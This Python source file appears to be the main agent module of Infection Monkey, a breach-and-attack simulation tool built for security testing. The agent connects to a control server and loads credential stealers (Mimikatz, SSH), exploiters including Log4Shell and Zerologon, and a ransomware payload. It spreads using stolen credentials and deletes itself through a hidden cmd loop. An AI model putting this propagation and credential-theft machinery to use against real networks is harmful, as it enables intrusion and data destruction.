import argparse
import logging
import multiprocessing
import os
import shutil
import subprocess
import sys
import time
from functools import partial
from itertools import chain
from pathlib import Path, WindowsPath
from tempfile import gettempdir
from typing import Optional, Sequence, Tuple

from pubsub.core import Publisher
from serpentarium import PluginLoader
from serpentarium.logging import configure_child_process_logger

from common import HARD_CODED_EXPLOITER_MANIFESTS, OperatingSystem
from common.agent_event_serializers import (
    AgentEventSerializerRegistry,
    register_common_agent_event_serializers,
)
from common.agent_events import (
    AgentShutdownEvent,
    CredentialsStolenEvent,
    HostnameDiscoveryEvent,
    OSDiscoveryEvent,
    PropagationEvent,
)
from common.agent_plugins import AgentPluginType
from common.agent_registration_data import AgentRegistrationData
from common.common_consts import AGENT_OTP_ENVIRONMENT_VARIABLE
from common.event_queue import IAgentEventQueue, PyPubSubAgentEventQueue, QueuedAgentEventPublisher
from common.network.network_utils import get_my_ip_addresses, get_network_interfaces
from common.tags.attack import T1082_ATTACK_TECHNIQUE_TAG
from common.types import OTP, NetworkPort, SocketAddress
from common.utils.argparse_types import positive_int
from common.utils.code_utils import del_key, secure_generate_random_string
from common.utils.file_utils import create_secure_directory
from common.utils.secret_variable import SecretVariable
from infection_monkey.agent_event_handlers import (
    AgentEventForwarder,
    add_stolen_credentials_to_propagation_credentials_repository,
    notify_relay_on_propagation,
)
from infection_monkey.credential_collectors import (
    MimikatzCredentialCollector,
    SSHCredentialCollector,
)
from infection_monkey.exploit import (
    CachingAgentBinaryRepository,
    ExploiterWrapper,
    IslandAPIAgentOTPProvider,
)
from infection_monkey.exploit.log4shell import Log4ShellExploiter
from infection_monkey.exploit.mssqlexec import MSSQLExploiter
from infection_monkey.exploit.powershell import PowerShellExploiter
from infection_monkey.exploit.sshexec import SSHExploiter
from infection_monkey.exploit.wmiexec import WmiExploiter
from infection_monkey.exploit.zerologon import ZerologonExploiter
from infection_monkey.i_master import IMaster
from infection_monkey.i_puppet import IPuppet
from infection_monkey.island_api_client import (
    AbstractIslandAPIClientFactory,
    HTTPIslandAPIClientFactory,
    IIslandAPIClient,
)
from infection_monkey.master import AutomatedMaster
from infection_monkey.master.control_channel import ControlChannel
from infection_monkey.network import TCPPortSelector
from infection_monkey.network.firewall import app as firewall
from infection_monkey.network.relay import TCPRelay
from infection_monkey.network.relay.utils import (
    IslandAPISearchResults,
    find_available_island_apis,
    notify_disconnect,
    send_remove_from_waitlist_control_message_to_relays,
)
from infection_monkey.network_scanning.http_fingerprinter import HTTPFingerprinter
from infection_monkey.network_scanning.mssql_fingerprinter import MSSQLFingerprinter
from infection_monkey.network_scanning.smb_fingerprinter import SMBFingerprinter
from infection_monkey.network_scanning.ssh_fingerprinter import SSHFingerprinter
from infection_monkey.payload.ransomware.ransomware_payload import RansomwarePayload
from infection_monkey.propagation_credentials_repository import (
    AggregatingPropagationCredentialsRepository,
    PropagationCredentialsRepository,
)
from infection_monkey.puppet import (
    PluginCompatabilityVerifier,
    PluginRegistry,
    PluginSourceExtractor,
)
from infection_monkey.puppet.puppet import Puppet
from infection_monkey.utils import agent_process, environment
from infection_monkey.utils.file_utils import mark_file_for_deletion_on_windows
from infection_monkey.utils.ids import get_agent_id, get_machine_id
from infection_monkey.utils.monkey_dir import create_monkey_dir, remove_monkey_dir
from infection_monkey.utils.propagation import maximum_depth_reached
from infection_monkey.utils.signal_handler import register_signal_handlers, reset_signal_handlers

from .heart import Heart
from .model import OTP_FLAG
from .plugin_event_forwarder import PluginEventForwarder

logger = logging.getLogger(__name__)
logging.getLogger("urllib3").setLevel(logging.INFO)


class InfectionMonkey:
    def __init__(self, args, ipc_logger_queue: multiprocessing.Queue, log_path: Path):
        logger.info("Agent is initializing...")

        self._agent_id = get_agent_id()
        self._log_path = log_path
        logger.info(f"Agent ID: {self._agent_id}")
        logger.info(f"Process ID: {os.getpid()}")

        context = multiprocessing.get_context("spawn")
        self._manager = context.Manager()

        self._opts = self._get_arguments(args)
        self._otp = self._get_otp()

        self._ipc_logger_queue = ipc_logger_queue

        self._agent_event_forwarder = None
        self._agent_event_queue = self._setup_agent_event_queue()
        self._agent_event_serializer_registry = self._setup_agent_event_serializers()

        plugin_event_queue = context.Queue()
        self._plugin_event_forwarder = PluginEventForwarder(
            plugin_event_queue, self._agent_event_queue
        )
        self._agent_event_publisher = QueuedAgentEventPublisher(plugin_event_queue)

        self._plugin_dir = (
            Path(gettempdir())
            / f"infection_monkey_plugins_{self._agent_id}_{secure_generate_random_string(n=20)}"
        )
        self._island_address, self._island_api_client = self._connect_to_island_api()
        self._register_agent()

        self._control_channel = ControlChannel(str(self._island_address), self._island_api_client)
        self._legacy_propagation_credentials_repository = (
            AggregatingPropagationCredentialsRepository(self._control_channel)
        )
        self._propagation_credentials_repository = PropagationCredentialsRepository(
            self._island_api_client, self._manager
        )

        self._heart = Heart(self._island_api_client)
        self._heart.start()

        self._current_depth = self._opts.depth
        self._master: Optional[IMaster] = None
        self._relay: Optional[TCPRelay] = None
        self._tcp_port_selector = TCPPortSelector(context, self._manager)

    @staticmethod
    def _get_arguments(args):
        arg_parser = argparse.ArgumentParser()
        arg_parser.add_argument("-p", "--parent")
        arg_parser.add_argument(
            "-s",
            "--servers",
            type=lambda arg: [SocketAddress.from_string(s) for s in arg.strip().split(",")],
        )
        arg_parser.add_argument("-d", "--depth", type=positive_int, default=0)
        opts = arg_parser.parse_args(args)
        InfectionMonkey._log_arguments(opts)

        return opts

    @staticmethod
    def _get_otp() -> OTP:
        # No need for a constant, this is a feature flag that will be removed.
        if OTP_FLAG not in os.environ:
            return SecretVariable("PLACEHOLDER_OTP")

        try:
            otp = SecretVariable(os.environ[AGENT_OTP_ENVIRONMENT_VARIABLE])
        except KeyError:
            raise Exception(
                f"Couldn't find {AGENT_OTP_ENVIRONMENT_VARIABLE} environmental variable. "
                f"Without an OTP the agent will fail to authenticate!"
            )

        # SECURITY: There's no need to leave this floating around in a place as visible as
        # environment variables for any longer than necessary.
        del_key(os.environ, AGENT_OTP_ENVIRONMENT_VARIABLE)

        return otp

    def _connect_to_island_api(self) -> Tuple[SocketAddress, IIslandAPIClient]:
        logger.debug(f"Trying to wake up with servers: {', '.join(map(str, self._opts.servers))}")
        server_clients = find_available_island_apis(
            self._opts.servers,
        )

        http_island_api_client_factory = HTTPIslandAPIClientFactory(
            self._agent_event_serializer_registry, self._agent_id
        )

        server, island_api_client = self._select_server(
            server_clients, http_island_api_client_factory
        )

        if server and island_api_client:
            logger.info(f"Using {server} to communicate with the Island")
        else:
            raise Exception(
                "Failed to connect to the island via any known servers: "
                f"[{', '.join(map(str, self._opts.servers))}]"
            )

        # NOTE: Since we pass the address for each of our interfaces to the exploited
        # machines, is it possible for a machine to unintentionally unregister itself from the
        # relay if it is able to connect to the relay over multiple interfaces?
        servers_to_close = (s for s in self._opts.servers if s != server and server_clients[s])
        send_remove_from_waitlist_control_message_to_relays(servers_to_close)

        return server, island_api_client

    def _select_server(
        self,
        island_api_statuses: IslandAPISearchResults,
        island_api_client_factory: AbstractIslandAPIClientFactory,
    ) -> Tuple[Optional[SocketAddress], Optional[IIslandAPIClient]]:
        for server in self._opts.servers:
            if island_api_statuses[server]:
                try:
                    island_api_client = island_api_client_factory.create_island_api_client(server)
                    island_api_client.login(self._otp)

                    return server, island_api_client
                except Exception as err:
                    logger.warning(f"Failed to connect and authenticate to {server}: {err}")

        return None, None

    def _register_agent(self):
        agent_registration_data = AgentRegistrationData(
            id=self._agent_id,
            machine_hardware_id=get_machine_id(),
            start_time=agent_process.get_start_time(),
            parent_id=self._opts.parent,
            cc_server=self._island_address,
            network_interfaces=get_network_interfaces(),
        )
        self._island_api_client.register_agent(agent_registration_data)

    @staticmethod
    def _log_arguments(args):
        arg_string = ", ".join([f"{key}: {value}" for key, value in vars(args).items()])
        logger.info(f"Agent started with arguments: {arg_string}")

    def start(self):
        self._setup_agent_event_forwarder()
        self._agent_event_forwarder.start()
        self._plugin_event_forwarder.start()

        logger.info("Agent is starting...")

        # This check must be done after the agent event forwarder is started, otherwise the agent
        # will be unable to send a shutdown event to the Island.
        should_stop = self._control_channel.should_agent_stop()
        if should_stop:
            logger.info("The Monkey Island has instructed this agent to stop")
            return

        operating_system = self._discover_os()
        self._discover_hostname()

        self._setup(operating_system)

    def _setup_agent_event_forwarder(self):
        self._agent_event_forwarder = AgentEventForwarder(self._island_api_client)
        self._agent_event_queue.subscribe_all_events(self._agent_event_forwarder.send_event)

    def _discover_os(self) -> OperatingSystem:
        timestamp = time.time()
        operating_system = environment.get_os()
        operating_system_version = environment.get_os_version()

        event = OSDiscoveryEvent(
            source=self._agent_id,
            timestamp=timestamp,
            tags={T1082_ATTACK_TECHNIQUE_TAG},
            os=operating_system,
            version=operating_system_version,
        )
        self._agent_event_queue.publish(event)

        return operating_system

    def _discover_hostname(self):
        timestamp = time.time()
        hostname = environment.get_hostname()

        event = HostnameDiscoveryEvent(
            source=self._agent_id,
            timestamp=timestamp,
            tags={T1082_ATTACK_TECHNIQUE_TAG},
            hostname=hostname,
        )
        self._agent_event_queue.publish(event)

    def _setup(self, operating_system: OperatingSystem):
        logger.debug("Starting the setup phase.")

        create_monkey_dir()

        if firewall.is_enabled():
            firewall.add_firewall_rule()

        config = self._control_channel.get_config()

        relay_port = self._tcp_port_selector.get_free_tcp_port()
        if relay_port is None:
            logger.error("No available ports. Unable to create a TCP relay.")
        else:
            self._relay = TCPRelay(
                relay_port,
                self._island_address,
                client_disconnect_timeout=config.keep_tunnel_open_time,
            )

            if not maximum_depth_reached(config.propagation.maximum_depth, self._current_depth):
                self._relay.start()

        servers = self._build_server_list(relay_port)
        self._master = self._build_master(servers, operating_system)

        register_signal_handlers(self._master)

        self._subscribe_events()

        self._master.start()

    def _setup_agent_event_queue(self) -> IAgentEventQueue:
        publisher = Publisher()
        pypubsub_agent_event_queue = PyPubSubAgentEventQueue(publisher)
        return pypubsub_agent_event_queue

    # TODO: This is just a placeholder for now. We will modify/integrate it with PR #2279.
    def _setup_agent_event_serializers(self) -> AgentEventSerializerRegistry:
        agent_event_serializer_registry = AgentEventSerializerRegistry()
        register_common_agent_event_serializers(agent_event_serializer_registry)

        return agent_event_serializer_registry

    def _build_master(self, servers: Sequence[str], operating_system: OperatingSystem) -> IMaster:
        local_network_interfaces = get_network_interfaces()
        puppet = self._build_puppet(operating_system)

        return AutomatedMaster(
            self._current_depth,
            servers,
            puppet,
            self._control_channel,
            local_network_interfaces,
            self._legacy_propagation_credentials_repository,
        )

    def _build_server_list(self, relay_port: Optional[NetworkPort]) -> Sequence[str]:
        my_relays = [f"{ip}:{relay_port}" for ip in get_my_ip_addresses()] if relay_port else []
        known_servers = chain(map(str, self._opts.servers), my_relays)

        # Dictionaries in Python 3.7 and later preserve key order. Sets do not preserve order.
        ordered_servers = {s: None for s in known_servers}

        return list(ordered_servers.keys())

    def _build_puppet(self, operating_system: OperatingSystem) -> IPuppet:
        create_secure_directory(self._plugin_dir)
        # SECURITY: Don't log the plugin directory name before it's created! This could introduce a
        #           race condition where the attacker may tail the log and create the directory with
        #           insecure permissions.
        logger.debug(f"Created {self._plugin_dir} to store agent plugins")

        agent_binary_repository = CachingAgentBinaryRepository(
            island_api_client=self._island_api_client,
            manager=self._manager,
        )

        plugin_source_extractor = PluginSourceExtractor(self._plugin_dir)
        plugin_loader = PluginLoader(
            self._plugin_dir, partial(configure_child_process_logger, self._ipc_logger_queue)
        )
        otp_provider = IslandAPIAgentOTPProvider(self._island_api_client)
        plugin_registry = PluginRegistry(
            operating_system,
            self._island_api_client,
            plugin_source_extractor,
            plugin_loader,
            agent_binary_repository,
            self._agent_event_publisher,
            self._propagation_credentials_repository,
            self._tcp_port_selector,
            otp_provider,
            self._agent_id,
        )
        plugin_compatability_verifier = PluginCompatabilityVerifier(
            self._island_api_client, HARD_CODED_EXPLOITER_MANIFESTS
        )
        puppet = Puppet(
            self._agent_event_queue, plugin_registry, plugin_compatability_verifier, self._agent_id
        )

        puppet.load_plugin(
            AgentPluginType.CREDENTIAL_COLLECTOR,
            "MimikatzCollector",
            MimikatzCredentialCollector(self._agent_event_queue, self._agent_id),
        )
        puppet.load_plugin(
            AgentPluginType.CREDENTIAL_COLLECTOR,
            "SSHCollector",
            SSHCredentialCollector(self._agent_event_queue, self._agent_id),
        )

        puppet.load_plugin(AgentPluginType.FINGERPRINTER, "http", HTTPFingerprinter())
        puppet.load_plugin(AgentPluginType.FINGERPRINTER, "mssql", MSSQLFingerprinter())
        puppet.load_plugin(AgentPluginType.FINGERPRINTER, "smb", SMBFingerprinter())
        puppet.load_plugin(AgentPluginType.FINGERPRINTER, "ssh", SSHFingerprinter())

        exploit_wrapper = ExploiterWrapper(
            self._agent_id,
            self._agent_event_queue,
            agent_binary_repository,
            self._tcp_port_selector,
            otp_provider,
        )

        puppet.load_plugin(
            AgentPluginType.EXPLOITER,
            "Log4ShellExploiter",
            exploit_wrapper.wrap(Log4ShellExploiter),
        )
        puppet.load_plugin(
            AgentPluginType.EXPLOITER,
            "PowerShellExploiter",
            exploit_wrapper.wrap(PowerShellExploiter),
        )
        puppet.load_plugin(
            AgentPluginType.EXPLOITER, "SSHExploiter", exploit_wrapper.wrap(SSHExploiter)
        )
        puppet.load_plugin(
            AgentPluginType.EXPLOITER, "WmiExploiter", exploit_wrapper.wrap(WmiExploiter)
        )
        puppet.load_plugin(
            AgentPluginType.EXPLOITER, "MSSQLExploiter", exploit_wrapper.wrap(MSSQLExploiter)
        )

        puppet.load_plugin(
            AgentPluginType.EXPLOITER,
            "ZerologonExploiter",
            exploit_wrapper.wrap(ZerologonExploiter),
        )

        puppet.load_plugin(
            AgentPluginType.PAYLOAD,
            "ransomware",
            RansomwarePayload(self._agent_event_queue, self._agent_id),
        )

        return puppet

    def _subscribe_events(self):
        self._agent_event_queue.subscribe_type(
            CredentialsStolenEvent,
            add_stolen_credentials_to_propagation_credentials_repository(
                self._propagation_credentials_repository,
                self._legacy_propagation_credentials_repository,
            ),
        )

        if self._relay:
            self._agent_event_queue.subscribe_type(
                PropagationEvent, notify_relay_on_propagation(self._relay)
            )

    def cleanup(self):
        logger.info("Agent cleanup started")
        deleted = None
        try:
            if self._master:
                self._master.cleanup()

            reset_signal_handlers()
            self._stop_relay()

            if firewall.is_enabled():
                firewall.remove_firewall_rule()
                firewall.close()

            deleted = InfectionMonkey._self_delete()

            self._send_log()

            self._publish_agent_shutdown_event()

            self._plugin_event_forwarder.flush()

            if self._agent_event_forwarder:
                self._agent_event_forwarder.flush()

            self._heart.stop()

            self._close_tunnel()

        except Exception as e:
            logger.exception(f"An error occurred while cleaning up the monkey agent: {e}")
            if deleted is None:
                InfectionMonkey._self_delete()
        finally:
            self._plugin_event_forwarder.stop()
            if self._agent_event_forwarder:
                self._agent_event_forwarder.stop()
            self._delete_plugin_dir()
            self._manager.shutdown()

        logger.info("Agent is shutting down")

    def _stop_relay(self):
        if self._relay and self._relay.is_alive():
            self._relay.stop()

            while self._relay.is_alive() and not self._control_channel.should_agent_stop():
                self._relay.join(timeout=5)

            if self._control_channel.should_agent_stop():
                self._relay.join(timeout=60)

    def _publish_agent_shutdown_event(self):
        agent_shutdown_event = AgentShutdownEvent(source=self._agent_id, timestamp=time.time())
        self._agent_event_queue.publish(agent_shutdown_event)

    def _close_tunnel(self):
        logger.info(f"Quitting tunnel {self._island_address.ip}")
        notify_disconnect(self._island_address)

    def _send_log(self):
        logger.info("Sending agent logs to the Island")
        log_contents = ""

        try:
            with open(self._log_path, "r") as f:
                log_contents = f.read()
        except FileNotFoundError:
            logger.exception(f"Log file {self._log_path} is not found.")

        self._island_api_client.send_log(log_contents)

    def _delete_plugin_dir(self):
        if not self._plugin_dir.exists():
            return

        try:
            shutil.rmtree(self._plugin_dir)
        except Exception as err:
            logger.warning(f"Failed to cleanup the plugin directory: {err}")

    @staticmethod
    def _self_delete() -> bool:
        logger.info("Cleaning up the Agent's artifacts")
        remove_monkey_dir()

        if "python" in Path(sys.executable).name:
            return False

        try:
            if "win32" == sys.platform:
                logger.info("Marking the Agent binary for deletion")
                mark_file_for_deletion_on_windows(WindowsPath(sys.executable))
                InfectionMonkey._self_delete_windows()
            else:
                logger.info("Deleting the Agent binary")
                InfectionMonkey._self_delete_linux()

            return True
        except Exception as exc:
            logger.exception("Exception in self delete: %s", exc)

        return False

    @staticmethod
    def _self_delete_windows():
        delay_delete_cmd = InfectionMonkey._build_windows_delete_command()
        startupinfo = InfectionMonkey._get_startup_info()

        subprocess.Popen(
            delay_delete_cmd,
            stdin=None,
            stdout=None,
            stderr=None,
            close_fds=True,
            startupinfo=startupinfo,
        )

    @staticmethod
    def _build_windows_delete_command() -> str:
        agent_pid = os.getpid()
        agent_file_path = sys.executable

        # Returns 1 if the process is running and 0 otherwise
        check_running_agent_cmd = f'tasklist /fi "PID eq {agent_pid}" ^| find /C "{agent_pid}"'

        sleep_seconds = 5
        delete_file_and_exit_cmd = f"del /f /q {agent_file_path} & exit"

        # Checks if the agent process is still running.
        # If the agent is still running, it sleeps for 'sleep_seconds' before checking again.
        # If the agent is not running, it deletes the executable and exits the loop.
        # The check runs up to 20 times to give the agent ample time to shutdown.
        delete_agent_cmd = (
            f'cmd /c (for /l %i in (1,1,20) do (for /F "delims=" %j IN '
            f'(\'{check_running_agent_cmd}\') DO if "%j"=="1" (timeout {sleep_seconds}) else '
            f"({delete_file_and_exit_cmd})) ) > NUL 2>&1"
        )

        return delete_agent_cmd

    @staticmethod
    def _get_startup_info():
        from subprocess import CREATE_NEW_CONSOLE, STARTF_USESHOWWINDOW, SW_HIDE

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags = CREATE_NEW_CONSOLE | STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = SW_HIDE

        return startupinfo

    @staticmethod
    def _self_delete_linux():
        os.remove(sys.executable)
